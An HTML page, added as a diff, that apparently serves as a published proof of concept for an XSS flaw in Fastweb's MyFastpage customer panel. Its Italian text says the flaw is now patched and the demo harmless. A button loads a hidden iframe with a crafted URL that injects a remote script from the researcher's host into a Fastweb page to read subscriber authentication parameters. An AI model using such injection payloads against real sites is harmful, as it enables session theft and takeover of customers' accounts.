@@ -1,0 +1,71 @@
+<html>
+<head><title>Fastweb myfastpage autorization control bypass</title>
+
+<script>
+function setIframeSource(name,url)
+{
+    var myframe = document.getElementById(name);
+    if(myframe !== null)  {
+         if(myframe.src){ myframe.src = url; }
+         else if(myframe.contentWindow !== null && myframe.contentWindow.location !== null){
+             myframe.contentWindow.location = url; }
+        else{ myframe.setAttribute('src', url); }
+    }
+
+}
+</script>
+
+<script type="text/javascript">
+lloogg_clientid = "93002008a618daf";
+</script>
+<script type="text/javascript" src="http://lloogg.com/l.js?c=93002008a618daf">
+</script>
+
+</head><body>
+<p>
+<em><a href="http://disse.cting.org/" >Dissecting</a> | <a href="http://disse.cting.org/security-2/fastweb-myfastpage-panel-control-hack">blog post</a> | <a href="fastweb.pdf"> advisory</a>
+</em></p>
+</h3>
+<p>
+<em><strong>La vulnerabilita' XSS e' stata corretta e il POC non e' piu' funzionante. Lascio comunque la pagina pubblica a chiunque vuole studiare il metodo di attacco utilizzato.
+</strong></em>
+</p>
+
+
+
+Questo POC dimostra come una vulnerabilita' XSS e' sfruttabile da un attaccante per accedere
+a pannelli di controllo di abbonati Fastweb semplicemente invintandoli a navigare su una pagina appositamente preparata.
+
+<p>
+Sfruttando un baco XSS e i deboli controlli autenticativi delle Myfastpage, sottrae i parametri di autenticazione dei
+pannelli di un abbonato, e se armato li invia a terzi. 
+</p>
+<p>
+Un link malevolo di questo tipo inviato per email o pubblicato su una pagina frequentata permette a un attaccante di
+consultare e variare dati e recapiti personali, consumi voce e internet, configurare ESSID e password della wifi, modificare le configurazioni dell'abbonamento.
+</p>
+
+<p>
+Questo esempio e' inoffensivo, gira sul browser e si limita a visualizzare a un utente fastweb gli indirizzi che un attaccante 
+potrebbe sottrarre. Nessun dato personale viene trasmesso a questo sito o a terzi.
+</p>
+
+
+<p>
+<em>Premendo il bottone si apre una finestra esemplificativa come in figura, assicurati che il popup non venga bloccato dal tuo browser. Se non sono bloccati ma non si apre
+e' possibile che utilizziate browser con protezioni anti XSS, come le ultime versioni di 
+<a href="http://blog.chromium.org/2010/01/security-in-depth-new-security-features.html">Chrome/Chromium</a>. Il POC e' testato su Firefox.</em>
+</p>
+<center>
+<INPUT TYPE="button" NAME="button" Value="Controlla la sicurezza della mia MyFastpage!" onclick="javascript:setIframeSource('frm','http://fastmomi.fastweb.it/app/services/common/FineFlusso.php?channel=MY%22%3E%3Cscript%20src=%27http://disse.cting.org/codes/fastweb.js%27%3E%3C/script%3E%3C%22FP&service=acq-ippd&account=&esito=MD5KO')">
+<p>
+
+<iframe id="frm" src="" width="0" height="0"></iframe> 
+</p>
+<p>
+<a href="fastweb.png"> <Img src="fastweb.png" ></img></a>
+</p>
+</center>
+
+</body>
+</html>
